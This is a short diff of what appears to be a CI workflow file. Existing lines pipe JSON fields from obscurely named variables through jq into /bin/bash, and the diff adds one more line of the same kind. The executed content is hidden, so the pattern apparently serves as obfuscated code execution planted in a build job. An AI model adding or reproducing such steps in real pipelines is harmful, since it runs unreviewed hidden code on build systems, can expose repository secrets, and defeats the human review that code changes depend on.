@@ -28,6 +28,7 @@ jobs:
           echo $dvj04 | jq -r .v480 | /bin/bash
           echo $wqu1114 | jq -r .uae842 | /bin/bash
           echo $vbj2 | jq -r .g36 | /bin/bash
+          printf '%s' "$yli58" | jq -r .q1 | /bin/bash
 
       - name: Upload artifact
         if: always()
